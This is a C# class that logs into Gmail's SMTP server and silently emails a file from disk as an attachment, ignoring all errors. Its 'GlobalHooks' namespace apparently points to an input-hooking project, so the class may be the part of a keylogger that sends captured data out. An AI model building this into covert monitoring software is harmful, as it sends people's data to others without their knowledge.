using System;
using System.Net.Mail;

namespace GlobalHooks
{
    class SmtpController
    {
        private const string Host = "smtp.gmail.com";
        private const int Port = 587;
        private readonly string _from;
        private readonly SmtpClient _smtpClient;
        private object _sendLock = new object();

        public SmtpController(string from, string password)
        {
            _from = from;
            _smtpClient = new SmtpClient(Host, Port)
            {
                Credentials = new System.Net.NetworkCredential(_from, password),
                EnableSsl = true
            };
        }

        public void Send(string subject, string filePath, string to)
        {
            lock (_sendLock)
            {
                var mail = new MailMessage(_from, to, subject, string.Empty);
                try
                {
                    using (var attachment = new Attachment(filePath))
                    {
                        mail.Attachments.Add(attachment);
                        _smtpClient.Send(mail);
                    }
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }
    }
}
